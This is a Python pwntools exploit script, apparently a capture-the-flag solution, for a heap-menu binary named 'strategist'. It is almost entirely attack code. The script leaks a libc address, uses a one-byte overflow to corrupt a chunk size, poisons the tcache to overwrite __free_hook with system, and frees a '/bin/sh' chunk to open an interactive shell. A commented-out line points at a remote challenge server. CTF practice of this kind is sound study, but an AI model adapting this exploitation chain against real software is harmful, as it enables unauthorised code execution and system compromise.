#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF('./strategist',checksec=False)
libc = ELF('./glibc/libc.so.6',checksec=False)

def create(size, data):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'> ', str(size).encode())
	p.sendafter(b'> ', data)

def show(idx, delimiter):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'> ', str(idx).encode())
	p.recvuntil(f'Plan [{idx}]: '.encode()+delimiter)
	return p.recvline()[:-1]

def edit(idx, data):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'> ', str(idx).encode())
	p.sendafter(b'> ', data)

def delete(idx):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b'> ', str(idx).encode())

p = process()
#p = remote('94.237.53.146',34393)
#p = gdb.debug(['./strategist'])

create(0x511, b'aaaa')
create(0x20, b'/bin/sh\x00')

delete(0)

create(0x20, b'a'*0x8)
libc_leak = u64(show(0, b'a'*8).ljust(8, b'\x00'))
libc.address = libc_leak - 0x3ec0d0
info(f'libc leak: {hex(libc_leak)}')
info(f'libc.address: {hex(libc.address)}')

create(0x28, b'a'*0x28)
for _ in range(3):
	create(0x20, b'b'*0x20)

input()
edit(2, b'd'*0x28+b'\x91')

input()
delete(3)
delete(5)
delete(4)

input()
create(0x80, b'e'*0x30+p64(libc.symbols.__free_hook))

input()
create(0x20, b'ffff')
create(0x20, p64(libc.symbols.system))

input()
delete(1)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
